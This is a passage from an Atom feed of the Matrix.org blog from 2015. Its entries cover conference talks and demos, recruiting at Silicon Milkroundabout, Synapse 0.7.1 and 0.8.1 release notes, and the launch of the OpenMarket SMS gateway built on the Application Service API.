        <content type="html">&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;www.webrtcworld.com&#x2F;conference&#x2F;east&#x2F;&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;05&#x2F;webrtc-logo-footer.png&quot; alt=&quot;webrtc-logo-footer&quot; width=&quot;200&quot; height=&quot;80&quot; class=&quot;alignright size-full wp-image-987&quot; &#x2F;&gt;&lt;&#x2F;a&gt; Matrix.org is happy to be sponsoring and talking at the &lt;a href=&quot;http:&#x2F;&#x2F;www.webrtcworld.com&#x2F;conference&#x2F;east&#x2F;&quot; title=&quot;WebRTC Conference &amp; Expo&quot;&gt;WebRTC Conference and Expo&lt;&#x2F;a&gt; in Miami, Florida, 12-14 May. Both Amandine and Matthew will be there - please come have a chat by &lt;a href=&quot;http:&#x2F;&#x2F;www.webrtcworld.com&#x2F;conference&#x2F;east&#x2F;floorplan-miami-2015.html&quot; title=&quot;booth #22&quot;&gt;booth #22&lt;&#x2F;a&gt;! This is one of the longest running WebRTC Events, and Matthew is delivering one of the keynotes of the conference on Wednesday 4:00-4:30pm in room K-07.&lt;&#x2F;p&gt;
&lt;p&gt;Matthew will also participate in the &amp;quot;Open Source Options for WebRTC Development&amp;quot; session in room D2-02 at 9:50am on Wednesday (full &lt;a href=&quot;http:&#x2F;&#x2F;www.webrtcworld.com&#x2F;conference&#x2F;east&#x2F;agenda.aspx&quot; title=&quot;agenda&quot;&gt;agenda&lt;&#x2F;a&gt; here). &lt;&#x2F;p&gt;
&lt;p&gt;Finally, Matrix will also be part of the WebRTC World Demos in room X-07 sometime between 4:30 and 7:30pm on Wednesday. Expect a dangerous demo! &lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Silicon Milkroundabout</title>
        <published>2015-05-11T00:00:00+00:00</published>
        <updated>2015-05-11T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/05/11/silicon-milkroundabout/" type="text/html"/>
        <id>https://matrix.org/blog/2015/05/11/silicon-milkroundabout/</id>
        
        <content type="html">&lt;p&gt;Just a quick note to say thanks to everyone who came to talk to us at &lt;a href=&quot;https:&#x2F;&#x2F;www.siliconmilkroundabout.com&#x2F;&quot; title=&quot;SMR9&quot;&gt;SMR9&lt;&#x2F;a&gt; yesterday. SMR is a great way for developers looking for jobs and startups needing engineers to have a chat.&lt;&#x2F;p&gt;
&lt;p&gt;We had a very busy day with plenty of people interested in Matrix and eager to join the team. We received a lot of CVs and will get back to you - but in the meantime please check out our &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&quot; title=&quot;code&quot;&gt;code&lt;&#x2F;a&gt; and come say hi in the &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;Matrix HQ room&quot;&gt;Matrix HQ room&lt;&#x2F;a&gt;, using any of &lt;a href=&quot;&#x2F;blog&#x2F;try-matrix-now&#x2F;&quot; title=&quot;these&quot;&gt;these&lt;&#x2F;a&gt; Matrix clients!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;05&#x2F;dave.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;05&#x2F;dave.png&quot; alt=&quot;dave&quot; width=&quot;395&quot; height=&quot;702&quot; class=&quot;aligncenter size-full wp-image-960&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;If you missed SMR, or just generally is interested in working for Matrix.org - please feel free to send your CV to &lt;a href=&quot;mailto:jobs@matrix.org&quot;&gt;us&lt;&#x2F;a&gt; - we need all kinds of developers, with skills ranging from backend and frontend to mobile development!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Matrix at Fluent</title>
        <published>2015-04-22T00:00:00+00:00</published>
        <updated>2015-04-22T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/04/22/matrix-at-fluent/" type="text/html"/>
        <id>https://matrix.org/blog/2015/04/22/matrix-at-fluent/</id>
        
        <content type="html">&lt;p&gt;This week, Matrix is visiting San Francisco for &lt;a href=&quot;http:&#x2F;&#x2F;fluentconf.com&#x2F;&quot; title=&quot;Fluent&quot;&gt;Fluent&lt;&#x2F;a&gt;, a web development conference over three days, with events ranging from 2-day training sessions to 10-min showcase presentations.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;fluent1.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;fluent1.png&quot; alt=&quot;fluent&quot; width=&quot;1328&quot; height=&quot;540&quot; class=&quot;aligncenter size-full wp-image-894&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;I had the opportunity to participate in the latter: Tuesday&#x27;s Solutions Showcase in the Community Lounge. The presentation was recorded, here is the &lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=JhZ1D_DFQAY&quot; title=&quot;video&quot;&gt;video&lt;&#x2F;a&gt; and &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;2015-04-20_Fluent_10min.pdf&quot;&gt;slides&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;I also had a 30-min in-depth &lt;a href=&quot;http:&#x2F;&#x2F;fluentconf.com&#x2F;javascript-html-2015&#x2F;public&#x2F;schedule&#x2F;detail&#x2F;42666&quot; title=&quot;talk&quot;&gt;talk&lt;&#x2F;a&gt; earlier today, where I went through a case study of adding Matrix to your existing app (&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;2015-04-20_Fluent_30min.pdf&quot;&gt;slides&lt;&#x2F;a&gt;). After evaluating options, we decided to use the &lt;a href=&quot;https:&#x2F;&#x2F;facebook.github.io&#x2F;flux&#x2F;docs&#x2F;chat.html&quot; title=&quot;flux-chat&quot;&gt;flux-chat&lt;&#x2F;a&gt; example by Facebook - it&#x27;s a basic chat application that uses their internal message dispatcher and showcases how a React&#x2F;Flux app works.&lt;&#x2F;p&gt;
&lt;p&gt;The code for the original example can be found &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;facebook&#x2F;flux&#x2F;tree&#x2F;master&#x2F;examples&#x2F;flux-chat&#x2F;&quot; title=&quot;here&quot;&gt;here&lt;&#x2F;a&gt;, and the complete diff of changes necessary to integrate it with Matrix - using the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&quot; title=&quot;matrix-js-sdk&quot;&gt;matrix-js-sdk&lt;&#x2F;a&gt; - can be found &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;facebook&#x2F;flux&#x2F;compare&#x2F;master...ara4n:mxstore&quot; title=&quot;here&quot;&gt;here&lt;&#x2F;a&gt; (thanks to Matthew for yet another late-night hack!). I think it&#x27;s very cool to see how easily their chat example can be turned into a Matrix client, albeit a fairly basic one! &lt;a href=&quot;http:&#x2F;&#x2F;arasphere.net&#x2F;flux&#x2F;examples&#x2F;flux-chat&#x2F;&quot; title=&quot;Here&quot;&gt;Here&lt;&#x2F;a&gt; is an online version if you want to try it out!&lt;&#x2F;p&gt;
&lt;table style=&quot;border:solid 0px #ffffff;&quot; border=&quot;0&quot; width=&quot;100%&quot;&gt;&lt;tr style=&quot;border:0&quot;&gt;&lt;td style=&quot;border:0&quot;&gt;
&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;flux-chat-org.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;flux-chat-org.png&quot; alt=&quot;flux-chat-org&quot; width=&quot;1199&quot; height=&quot;756&quot; class=&quot;aligncenter size-full wp-image-885&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
&lt;td style=&quot;border:0&quot;&gt;&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;flux-chat-matrix1.png&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;flux-chat-matrix1.png&quot; alt=&quot;flux-chat-matrix&quot; width=&quot;1199&quot; height=&quot;756&quot; class=&quot;aligncenter size-full wp-image-883&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;tr style=&quot;border:0&quot;&gt;
&lt;td style=&quot;border:0&quot; colspan=&quot;2&quot;&gt;&lt;em&gt;&lt;center&gt;The original flux-chat and the Matrix-enabled flux-chat&lt;&#x2F;center&gt;&lt;&#x2F;em&gt;
&lt;&#x2F;td&gt;
&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;
&lt;p&gt;If you have any questions or comments, we are still at Fluent - you can catch us in the exhibition hall in booth #208 - or virtually, as always, in &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Back from the WebRTC and Kranky Geek conferences</title>
        <published>2015-04-17T00:00:00+00:00</published>
        <updated>2015-04-17T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/04/17/back-from-the-webrtc-and-kranky-geek-conferences/" type="text/html"/>
        <id>https://matrix.org/blog/2015/04/17/back-from-the-webrtc-and-kranky-geek-conferences/</id>
        
        <content type="html">&lt;p&gt;This week, Matthew and myself went to the &lt;a href=&quot;http:&#x2F;&#x2F;webrtc-conference.com&#x2F;&quot; title=&quot;WebRTC conference&quot;&gt;WebRTC conference&lt;&#x2F;a&gt; and its related &lt;a href=&quot;http:&#x2F;&#x2F;webrtc-conference.com&#x2F;kranky-geek&#x2F;&quot; title=&quot;Kranky Geek&quot;&gt;Kranky Geek&lt;&#x2F;a&gt; event in sunny London.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;ipcortex&#x2F;status&#x2F;588261705144262656&quot; title=&quot;picture credit: twitter.com&#x2F;ipcortex&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;matrix1.jpg&quot; alt=&quot;Matrix at WebRTC conference London 2015&quot; width=&quot;1024&quot; height=&quot;579&quot; class=&quot;aligncenter size-full wp-image-799&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Matrix had a speaker slot in both events; the first talk was &amp;quot;Proposing an open interoperable signalling layer for WebRTC&amp;quot; (&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;2015-04-15-Matrix-WebRTC-London.pdf&quot;&gt;slides&lt;&#x2F;a&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;As I was talking to people in the tea-breaks between sessions, I was actually surprised at the amount of people who not only knew about Matrix, but who had been following eagerly since the early days, and had questions about specific features and recent developments!&lt;&#x2F;p&gt;
&lt;p&gt;Later in the day it was time for the Kranky Geek, and the talk then was a bit more technical: &amp;quot;Interoperable HTTP Signalling with Matrix&amp;quot; (&lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;2015-04-15-Matrix-WebRTC-Kranky-Geek.pdf&quot;&gt;slides&lt;&#x2F;a&gt;). The talk included a &amp;quot;dangerous demo&amp;quot; where we made a WebRTC call from our Matrix iOS App to our webclient for the first time - thanks to the &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;OpenWebRTC&#x2F;status&#x2F;588784386440593408&quot; title=&quot;OpenWebRTC&quot;&gt;OpenWebRTC&lt;&#x2F;a&gt; team for helping us make the demo!&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;webrtcHacks&#x2F;status&#x2F;588341443363786752&quot; title=&quot;picture credit: twitter.com&#x2F;webrtcHacks&quot;&gt;&lt;img src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;04&#x2F;matrix-krankygeek.jpg&quot; alt=&quot;matrix-krankygeek&quot; width=&quot;1024&quot; height=&quot;576&quot; class=&quot;aligncenter size-full wp-image-800&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;What&#x27;s great about these kind of events is the feedback and discussion following talks; lots of people have relevant experiences and opinions that they are happy to share, and of course questions on how exactly different features actually work. &lt;&#x2F;p&gt;
&lt;p&gt;It&#x27;s always great to meet new people and have lots of various discussions. Hopefully we have got a few more people interested in Matrix - we have already seen some new joiners in the &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; room! &lt;&#x2F;p&gt;
&lt;p&gt;Next up is &lt;a href=&quot;http:&#x2F;&#x2F;fluentconf.com&#x2F;javascript-html-2015&#x2F;&quot;&gt;Fluent&lt;&#x2F;a&gt; in San Francisco next week, where I will be &lt;a href=&quot;http:&#x2F;&#x2F;fluentconf.com&#x2F;javascript-html-2015&#x2F;public&#x2F;schedule&#x2F;detail&#x2F;42666&quot; title=&quot;speaking&quot;&gt;speaking&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Video: IoT through Matrix</title>
        <published>2015-04-08T00:00:00+00:00</published>
        <updated>2015-04-08T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/04/08/video-iot-through-matrix/" type="text/html"/>
        <id>https://matrix.org/blog/2015/04/08/video-iot-through-matrix/</id>
        
        <content type="html">&lt;p&gt;Earlier this year we went to &lt;a href=&quot;http:&#x2F;&#x2F;fosdem.org&quot; title=&quot;FOSDEM&quot;&gt;FOSDEM&lt;&#x2F;a&gt; - as reported in an &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2015&#x2F;02&#x2F;04&#x2F;back-from-fosdem&#x2F;&quot; title=&quot;earlier blog post&quot;&gt;earlier blog post&lt;&#x2F;a&gt;. &lt;&#x2F;p&gt;
&lt;p&gt;Both the recording equipment and the video team volunteers were new this year, so some problems were encountered, which means that our lightning talk video unfortunately was lost. However, our talk in the IoT-devroom is now available:&lt;&#x2F;p&gt;
&lt;video width=&quot;853&quot; height=&quot;480&quot; controls&gt;
  &lt;source src=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;video&#x2F;IoT-through-Matrix.mp4&quot; type=&quot;video&#x2F;mp4&quot; &#x2F;&gt;
Your browser does not support the video tag.
&lt;&#x2F;video&gt;
&lt;em&gt;(Click &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;video&#x2F;IoT-through-Matrix.mp4&quot; title=&quot;here&quot;&gt;here&lt;&#x2F;a&gt; to download the video)&lt;&#x2F;em&gt;
&lt;p&gt;The slides are also &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;02&#x2F;2015-02-01-Matrix-IoT-FOSDEM.pdf&quot;&gt;available&lt;&#x2F;a&gt;. You can check out the slides from the &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;02&#x2F;2015-01-31-Matrix_FOSDEM.pdf&quot; title=&quot;lightning talk&quot;&gt;lightning talk&lt;&#x2F;a&gt; as well.&lt;&#x2F;p&gt;
&lt;p&gt;As always, questions and comments are very welcome in the &lt;a href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot; title=&quot;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt; room! &lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.8.1 is here!</title>
        <published>2015-03-26T00:00:00+00:00</published>
        <updated>2015-03-26T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/03/26/synapse-0-8-1-is-here/" type="text/html"/>
        <id>https://matrix.org/blog/2015/03/26/synapse-0-8-1-is-here/</id>
        
        <content type="html">&lt;p&gt;Heads up that we released Synapse 0.8.1 a little while back, but we&#x27;ve all been too busy writing software to announce it... you know how it goes. Anyway, here are the changes:&lt;&#x2F;p&gt;
&lt;ul&gt;
	&lt;li&gt;Disable registration by default. New users can be added using the included &lt;code&gt;register_new_matrix_user&lt;&#x2F;code&gt; script or by enabling registration in the config.&lt;&#x2F;li&gt;
	&lt;li&gt;Add metrics to synapse. To enable metrics use config options &lt;code&gt;enable_metrics&lt;&#x2F;code&gt; and &lt;code&gt;metrics_port&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
	&lt;li&gt;Fix bug where banning only kicked the user.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Note that first one in particular: if you set up a new install, you won&#x27;t be able to register new users using the API by default. This means random people on the Internet can&#x27;t create accounts on your Home Server unless you actually choose to let them. Also, if you were trying to ban users and noticed that didn&#x27;t work... yeah, we fixed that.
&lt;p&gt;Okay, back to writing software again!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Welcoming the OpenMarket Matrix Gateway!</title>
        <published>2015-02-26T00:00:00+00:00</published>
        <updated>2015-02-26T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/02/26/welcoming-the-openmarket-matrix-gateway/" type="text/html"/>
        <id>https://matrix.org/blog/2015/02/26/welcoming-the-openmarket-matrix-gateway/</id>
        
        <content type="html">&lt;p&gt;Last week, we mentioned that we released part of a first implementation of the long awaited &lt;a title=&quot;Application Service (AS) API&quot; href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;#application-service-api&quot;&gt;Application Service (AS) API&lt;&#x2F;a&gt; as part of the &lt;a title=&quot;Synapse 0.7.1 released – with Application Service API&quot; href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2015&#x2F;02&#x2F;19&#x2F;synapse-0-7-1-released-with-application-service-api&#x2F;&quot;&gt;0.7.1 release&lt;&#x2F;a&gt;. The AS API makes it dead simple to connect your service into the Matrix ecosystem using an existing standard Matrix server.&lt;&#x2F;p&gt;
&lt;p&gt;And today we&#x27;re very excited that the first implementation using this API has gone live! &lt;a title=&quot;OpenMarket&quot; href=&quot;http:&#x2F;&#x2F;openmarket.com&quot;&gt;OpenMarket&lt;&#x2F;a&gt; just announced the &lt;a title=&quot;OpenMarket Matrix Gateway&quot; href=&quot;http:&#x2F;&#x2F;www.openmarket.com&#x2F;matrix&#x2F;&quot;&gt;OpenMarket Matrix Gateway&lt;&#x2F;a&gt; which lets you chat with non-Matrix users via their phone number: as you send and receive instant messages from your Matrix chat room, they&#x27;ll receive and send SMSes back to you, which will appear in your Matrix room as IM, extending your reach to any non-Matrix user.&lt;&#x2F;p&gt;
&lt;p&gt;To use the new OpenMarket service just login to the matrix.org &lt;a title=&quot;webclient&quot; href=&quot;&#x2F;beta&#x2F;&quot;&gt;webclient&lt;&#x2F;a&gt; and start a chat with your target mobile phone user by identifying him&#x2F;her with a Matrix ID in the format &lt;em&gt;@+&amp;lt;msisdn&amp;gt;:matrix.openmarket.com&lt;&#x2F;em&gt; (msisdn being the internationally formatted phone number of your contact) - any messages to them will be sent via OpenMarket&#x27;s SMS service. The SMSes will be sent from dynamically assigned numbers so that the recipient is able to respond to your message(s) - and the user will first receive an &amp;quot;opt-in&amp;quot; message from the OpenMarket Matrix Gateway to invite them to the conversation (just as they would if you invited them to a conversation in Matrix). Note that there are a finite set of these dynamically assigned numbers: OpenMarket reserves the right to recycle contact numbers if they have not been used to send or receive traffic for more than 2 months.&lt;&#x2F;p&gt;
&lt;p&gt;Sending SMS through the OpenMarket Matrix Gateway will be free during the introductory beta testing period, and users will be warned when that changes - although usage is subject to a per-user fair-usage policy. Despite the free service today, you&#x27;ll have to associate a valid PayPal account to your account in order to send messages for security purposes. OpenMarket will not (and cannot) charge this account without your consent. You can associate your PayPal account via the settings page of any reference Matrix web client which has been configured to be aware of the OpenMarket Matrix Gateway - for example, the matrix.org &lt;a title=&quot;webclient&quot; href=&quot;&#x2F;beta&#x2F;#&#x2F;settings&quot;&gt;webclient&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;You&#x27;ll also have to accept the OpenMarket Matrix API End User License Agreement to use the service.&lt;&#x2F;p&gt;
&lt;p&gt;The OpenMarket Matrix Gateway is a great example of how the Application Service API can be used to extend Matrix, we&#x27;re really happy to see it live and hope it&#x27;s going to give our community lots of ideas! There are a lot of services that could mutually benefit from being integrated with Matrix, and the AS API makes this much easier to accomplish!&lt;&#x2F;p&gt;
&lt;p&gt;Thus, we strongly urge you to have a look at the &lt;a title=&quot;AS API&quot; href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;#application-service-api&quot;&gt;AS API&lt;&#x2F;a&gt; - and as always we are happy to answer any questions at &lt;a title=&quot;#matrix:matrix.org&quot; href=&quot;&#x2F;beta&#x2F;#&#x2F;room&#x2F;#matrix:matrix.org&quot;&gt;#matrix:matrix.org&lt;&#x2F;a&gt;!&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.7.1 released - with Application Service API</title>
        <published>2015-02-19T00:00:00+00:00</published>
        <updated>2015-02-19T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/02/19/synapse-0-7-1-released-with-application-service-api/" type="text/html"/>
        <id>https://matrix.org/blog/2015/02/19/synapse-0-7-1-released-with-application-service-api/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We released Synapse 0.7.1 this morning - &lt;strong&gt;This release includes more critical federation stability and performance updates - please upgrade as soon as you can!&lt;&#x2F;strong&gt;.  You can get the code and installation instructions from &lt;a href=&quot;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&quot;&gt;http:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&lt;&#x2F;a&gt; as normal.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;b&gt;Update:&lt;&#x2F;b&gt; You can also install and run Synapse now via &lt;a href=&quot;http:&#x2F;&#x2F;docker.com&quot;&gt;Docker&lt;&#x2F;a&gt;, thanks to a Dockerfile at &lt;a href=&quot;https:&#x2F;&#x2F;registry.hub.docker.com&#x2F;u&#x2F;silviof&#x2F;docker-matrix&#x2F;&quot;&gt;https:&#x2F;&#x2F;registry.hub.docker.com&#x2F;u&#x2F;silviof&#x2F;docker-matrix&#x2F;&lt;&#x2F;a&gt; contributed today by Silvio Fricke.  Thanks Silvio!!&lt;&#x2F;p&gt;
&lt;p&gt;Other than the federation improvements, the big new feature that lands here is the long-awaited Application Service API.  This is a set of simple extensions to the Client-Server API to make it much easier to build powerful gateways and other application logic on top of Matrix.  You can think of it being somewhere between IRC Services, IMS application services and XMPP components - but with the simplicity of an IRC bot.  The extensions let you register application services as privileged Matrix clients, and create virtual users and virtual rooms in bulk within Matrix (e.g. bridging an entire IRC network into Matrix).  The API also lets your application service receive inbound events as HTTP pushes rather than having to poll.  The end result is that it&#x27;s suddenly become &lt;strong&gt;a lot&lt;&#x2F;strong&gt; easier to bridge existing communities with Matrix!&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ll post another blog post shortly to give a lot more information; in the interim you can read more about it in the newly updated spec at &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;#application-service-api&quot;&gt;http:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;spec&#x2F;#application-service-api&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;br&#x2F;&gt;
&lt;pre&gt;
Changes in synapse v0.7.1 (2015-02-19)
======================================
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Initial alpha implementation of parts of the Application Services API.
Including:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;AS Registration &#x2F; Unregistration&lt;&#x2F;li&gt;
&lt;li&gt;User Query API&lt;&#x2F;li&gt;
&lt;li&gt;Room Alias Query API&lt;&#x2F;li&gt;
&lt;li&gt;Push transport for receiving events.&lt;&#x2F;li&gt;
&lt;li&gt;User&#x2F;Alias namespace admin control&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Add cache when fetching events from remote servers to stop repeatedly
fetching events with bad signatures.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Respect the per remote server retry scheme when fetching both events and
server keys to reduce the number of times we send requests to dead servers.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Inform remote servers when the local server fails to handle a received event.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Turn off python bytecode generation due to problems experienced when
upgrading from previous versions.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;pre&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Back from FOSDEM!</title>
        <published>2015-02-04T00:00:00+00:00</published>
        <updated>2015-02-04T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2015/02/04/back-from-fosdem/" type="text/html"/>
        <id>https://matrix.org/blog/2015/02/04/back-from-fosdem/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;http:&#x2F;&#x2F;fosdem.org&quot; title=&quot;FOSDEM&quot;&gt;FOSDEM&lt;&#x2F;a&gt; was great fun! Two days full of conferences and demos; lots of interesting technologies and interested people - and most of all: talking to so many new faces about Matrix and potential uses and integration ideas. &lt;&#x2F;p&gt;
&lt;p&gt;Both our lightning talk and IoT-devroom talk were completely filled up with huge queues outside (sorry folks), and our demos seemed to go down fairly well.  In fact several people &lt;a href=&quot;&#x2F;code&quot;&gt;set up their own homeserver&lt;&#x2F;a&gt; and joined the federated network of Matrix servers during FOSDEM itself!&lt;&#x2F;p&gt;
&lt;p&gt;Here&#x27;s a &lt;a href=&quot;http:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;561535884567130112&quot; title=&quot;view from our stand&quot;&gt;view from our stand&lt;&#x2F;a&gt;, from our &lt;a href=&quot;http:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;561543011662696448&quot; title=&quot;lightning talk&quot;&gt;lightning talk&lt;&#x2F;a&gt; and from our &lt;a href=&quot;http:&#x2F;&#x2F;twitter.com&#x2F;thierrymarianne&#x2F;status&#x2F;561828001231695872&quot; title=&quot;IoT-devroom talk&quot;&gt;IoT-devroom talk&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;If you missed the talks, recordings will (soon) be available from the FOSDEM site (links will be added here once available) - in the meantime you can check out the slides here: &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;02&#x2F;2015-01-31-Matrix_FOSDEM.pdf&quot; title=&quot;lightning talk&quot;&gt;lightning talk&lt;&#x2F;a&gt; and &lt;a href=&quot;http:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2015&#x2F;02&#x2F;2015-02-01-Matrix-IoT-FOSDEM.pdf&quot; title=&quot;IoT-devroom talk&quot;&gt;IoT-devroom talk&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
